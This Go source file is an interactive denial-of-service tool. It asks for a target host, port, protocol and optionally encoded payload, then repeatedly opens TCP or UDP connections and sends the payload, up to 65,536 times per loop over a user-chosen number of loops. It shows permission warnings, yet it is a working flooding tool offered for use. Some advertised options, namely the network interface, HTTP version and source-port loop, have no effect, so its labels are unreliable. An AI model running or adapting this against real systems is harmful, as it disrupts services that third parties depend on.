package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"html"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	fmt.Println(`
	===========================================
	|              DoS Test Tool              |
	===========================================
	`)

	// Step 1: Select Network Interface
	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error fetching network interfaces:", err)
		return
	}

	fmt.Println("Select a network interface to use:")
	for i, iface := range interfaces {
		fmt.Printf("%d: %s\n", i+1, iface.Name)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter the number of the interface: ")
	interfaceChoice, _ := reader.ReadString('\n')
	interfaceChoice = strings.TrimSpace(interfaceChoice)
	interfaceIdx, err := strconv.Atoi(interfaceChoice)
	if err != nil || interfaceIdx < 1 || interfaceIdx > len(interfaces) {
		fmt.Println("Invalid choice. Exiting.")
		return
	}
	selectedInterface := interfaces[interfaceIdx-1]
	fmt.Println("Selected interface:", selectedInterface.Name)

	// Step 2: Input Target
	fmt.Print("Enter target domain, IP, or CIDR: ")
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	// Step 3: Input Port
	fmt.Print("Enter target port: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		fmt.Println("Invalid port number. Exiting.")
		return
	}

	// Step 4: Choose Connection Type
	fmt.Println("Choose connection type: ")
	fmt.Println("1: TCP")
	fmt.Println("2: UDP")
	connType, _ := reader.ReadString('\n')
	connType = strings.TrimSpace(connType)
	if connType != "1" && connType != "2" {
		fmt.Println("Invalid connection type. Exiting.")
		return
	}
	protocol := "tcp"
	if connType == "2" {
		protocol = "udp"
	}

	// Step 5: Enter Payload
	fmt.Print("Enter payload: ")
	payload, _ := reader.ReadString('\n')
	payload = strings.TrimSpace(payload)

	// Warning 1
	fmt.Println("WARNING: Ensure you have permission to conduct this activity.")
	fmt.Print("Do you want to continue? (Y/N): ")
	permission, _ := reader.ReadString('\n')
	permission = strings.ToUpper(strings.TrimSpace(permission))
	if permission != "Y" {
		fmt.Println("Exiting.")
		return
	}

	// Step 6: HTTP version and encoding
	fmt.Println("Choose HTTP version:")
	fmt.Println("1: HTTP/1.1")
	fmt.Println("2: HTTP/2")
	httpVersion, _ := reader.ReadString('\n')
	httpVersion = strings.TrimSpace(httpVersion)
	if httpVersion != "1" && httpVersion != "2" {
		fmt.Println("Invalid choice. Exiting.")
		return
	}

	fmt.Print("Should the data in requests be encoded? (Y/N): ")
	encodeChoice, _ := reader.ReadString('\n')
	encodeChoice = strings.ToUpper(strings.TrimSpace(encodeChoice))
	if encodeChoice == "Y" {
		fmt.Println("Choose encoding type:")
		fmt.Println("1: URL")
		fmt.Println("2: HTML")
		fmt.Println("3: Base64")
		fmt.Println("4: Unicode")
		encodingChoice, _ := reader.ReadString('\n')
		encodingChoice = strings.TrimSpace(encodingChoice)
		switch encodingChoice {
		case "1":
			payload = url.QueryEscape(payload)
		case "2":
			payload = html.EscapeString(payload)
		case "3":
			payload = base64.StdEncoding.EncodeToString([]byte(payload))
		case "4":
			encodedPayload := ""
			for _, r := range payload {
				encodedPayload += fmt.Sprintf("\\u%04x", r)
			}
			payload = encodedPayload
		default:
			fmt.Println("Invalid encoding choice. Exiting.")
			return
		}
	}

	// Warning 2
	fmt.Println("WARNING: This activity is illegal without explicit permission from the target.")
	fmt.Print("Do you want to continue? (Y/N): ")
	finalPermission, _ := reader.ReadString('\n')
	finalPermission = strings.ToUpper(strings.TrimSpace(finalPermission))
	if finalPermission != "Y" {
		fmt.Println("Exiting.")
		return
	}

	// Step 7: Enter loop count
	fmt.Print("Enter number of loops (t): ")
	loopCountStr, _ := reader.ReadString('\n')
	loopCountStr = strings.TrimSpace(loopCountStr)
	loopCount, err := strconv.Atoi(loopCountStr)
	if err != nil || loopCount < 1 {
		fmt.Println("Invalid loop count. Exiting.")
		return
	}

	// Step 8: Execute the attack
	fmt.Println("Starting test...")

	for t := 0; t < loopCount; t++ {
		for srcPort := 0; srcPort <= 65535; srcPort++ {
			address := fmt.Sprintf("%s:%d", target, portNum)

			if protocol == "tcp" {
				conn, err := net.Dial("tcp", address)
				if err != nil {
					fmt.Println("Error connecting to target:", err)
					continue
				}
				_, err = conn.Write([]byte(payload))
				if err != nil {
					fmt.Println("Error sending payload:", err)
				}
				conn.Close()
			} else if protocol == "udp" {
				conn, err := net.Dial("udp", address)
				if err != nil {
					fmt.Println("Error connecting to target:", err)
					continue
				}
				_, err = conn.Write([]byte(payload))
				if err != nil {
					fmt.Println("Error sending payload:", err)
				}
				conn.Close()
			}

			// Simulate delay to prevent overwhelming the network
			time.Sleep(10 * time.Millisecond)
		}
	}

	fmt.Println("Test completed.")
}
